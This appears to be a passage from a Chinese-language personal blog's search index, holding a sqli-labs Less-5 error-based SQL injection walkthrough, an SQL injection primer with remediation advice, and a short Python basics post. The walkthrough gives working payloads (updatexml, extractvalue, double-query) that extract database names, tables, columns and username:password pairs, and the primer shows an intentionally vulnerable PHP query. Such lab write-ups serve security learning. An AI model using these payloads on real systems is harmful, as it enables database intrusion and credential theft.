href="https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">子查询</a>，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码。</p><h2 id="sqli靶场less5"><a href="#sqli靶场less5" class="headerlink" title="sqli靶场less5"></a>sqli靶场less5</h2><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230514102049350.png" alt="image-20230514102049350"></p><p>1.判断注入类型</p><p>get 1’ and ’1’ =’1 回显如下：</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231110006.png" alt="image-20230510231110006"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231854074.png" alt="image-20230510231854074"></p><pre><code>？id=1’ 报错，单引号导致，页面显示数据库的报错信息，确定注入点为单引号字符型</code></pre><p>2.判断报错函数是否可用</p><pre><code>？id=0&#39; and updatexml(1,0x7e)--a</code></pre><p>页面正常报错，确定报错函数可用</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232558988.png" alt="image-20230510232558988"></p><p>3.脱库</p><p>获取所有的数据库，地址栏输入：</p><pre><code>?id=1&#39; and updatexml(1,    substr(      concat(0x7e,          (select group_concat(schema_name)           from information_schema.schemata)       )    ,34,31),3) -- a</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232905062.png" alt="image-20230510232905062"></p><p>获取security库中的所有表，地址栏输入：</p><pre><code>?id=1&#39; and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39;))) %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233507675.png" alt="image-20230510233507675"></p><p>查user表中的列名</p><pre><code>？id=1&#39; union select 1,2, (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;)),1)) %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233925272.png" alt="image-20230510233925272"></p><p>查字段（双查询注入）</p><pre><code>1&#39; union select 1, count(*), concat((select concat(username,&#39;:&#39;,password) from users  limit 0,1), floor(rand(0)*2)) a from information_schema.tables group by a  %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234240463.png" alt="image-20230510234240463"></p><p>将0改为1,2,3,4……..</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234427307.png" alt="image-20230510234427307"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234518718.png" alt="image-20230510234518718"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234547823.png" alt="image-20230510234547823"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234636472.png" alt="image-20230510234636472"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/05/07/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/07/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p><code>SQL注入就是在web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库的任意操作。</code></p><p>php代码举例：</p><pre><code>$query = &quot;select * from users where id = $_GET[&#39;id&#39;];</code></pre><h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>sql注入漏洞的产生需要满足以下两个条件：</p><p>1.<code>参数用户可控</code>：前端传给后端的参数内容是用户可以控制的；</p><p>2.<code>参数传入数据库查询</code>：传入的参数拼接到sql语句，且带入数据库查询。</p><p>当传入的id参数为 1’ 时，</p><pre><code>select * from users where id=1&#39;</code></pre><p>这不符合数据库语法的规范，所以会报错。</p><p>当传入的id参数为and 1=1 时，</p><pre><code>select * from users where id= 1 and 1 = 1</code></pre><p>因为1 = 1为真，且where语句中id=1也为真，所以页面会返回与id = 1相同的结果，</p><p>当传入的id参数为and 1 =2时，由于 1=2不成立，所以返回假，页面就会返回与id =1不同的结果。</p><h2 id="mysql查询语句"><a href="#mysql查询语句" class="headerlink" title="mysql查询语句"></a>mysql查询语句</h2><p>1.在不知道任何条件时，</p><pre><code>select 要查询的字段名 from 库名.表名</code></pre><p>2.在知道一条已知条件时，</p><pre><code>select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#39;已知条件的值&#39;</code></pre><p>3.在知道两条已知条件时，</p><pre><code>select 要查询的字段名 from 库名.表名 where 已知条件1的字段名 = &#39;已知条件1的值&#39; and 已知条件2的字段名=&#39;已知条件2的值&#39;</code></pre><h2 id="limit用法"><a href="#limit用法" class="headerlink" title="limit用法"></a>limit用法</h2><p>limit的使用格式为limit m ,n, 其中m是记录开始的位置，从0开始，表示第一条记录；n是指取n条记录。</p><p>eg：limit 0,1表示从第一条记录开始，去一条记录。</p><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>mysql中常见的注释符： #或  –空格  或  /**/</p><h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><pre><code>内联注释的形式：/*!code*/</code></pre><p>内联注释可以用于整个sql语句</p><pre><code>index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</code></pre><p>?加参数  &amp;连接参数</p><h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><p>1.按照提交的数据类型有：数字型、字符型和搜索型</p><p>2.按照提交方式有：GET注入、POST注入、cookie注入、http头注入等</p><p>3.按照执行效果有：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入</p><h2 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h2><p>1.<code>数据库信息泄漏</code>：数据库中存放的用户的隐私信息的泄露。</p><p>2.<code>网页篡改</code>：通过操纵数据库对特定网页进行篡改。</p><p>3.<code>网站被挂马，传播恶意软件</code>：修改数据库一些字段值，嵌入网马链接，进行挂马攻击。</p><p>4.<code>数据库被恶意操作</code>：数据库服务器被攻击，数据库的系统管理员账户被篡改。</p><p>5.<code>服务器被远程控制，被安装后门</code>。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p><p>6.<code>破坏硬盘数据，瘫痪全系统</code>。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.<code>过滤危险字符</code>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。</p><p>2.<code>使用预编译语句</code>：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的<code>增加</code>、<code>删除</code>、<code>修改</code>、<code>查询</code>。</p><p>3.<code>特殊字符转义、使用严格的数据类型</code>。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h1 id="一、数学计算符"><a href="#一、数学计算符" class="headerlink" title="一、数学计算符"></a>一、数学计算符</h1><p>1.+加 -减 *乘 /除 //整除 %余数 **幂指数</p><p>2.变量：python的容器，跟print函数（打印数据类型及函数对象）</p><p>异曲同工：变量可以存放数据类型及函数对象，简短的代码（结果也属于Python中的数据类型）</p><p>使用变量来存放字符串及数值</p><p>存放的过程在Python中叫’赋值’，赋值就是=符号，不是数学中的等于</p><p>Python中的等于是”==”，赋值是”=”，一个’=’叫赋值，两个”==”叫等于</p><p>eg：1.</p><p>a=’小许’  b=3  c=3+4</p><p>print(c)</p><ol><li></li></ol><p>2==2</p><p>true 布尔值就是由条件判断得到的</p><p>变量，帮助我们减少代码的复杂性，增强可读性，不管用户输入什么都不会影响我们提前写好代码</p><h1 id="二、命名"><a href="#二、命名" class="headerlink" title="二、命名"></a>二、命名</h1><p>命名：采用驼峰命名法，字母开头(小写)，下换线结尾</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
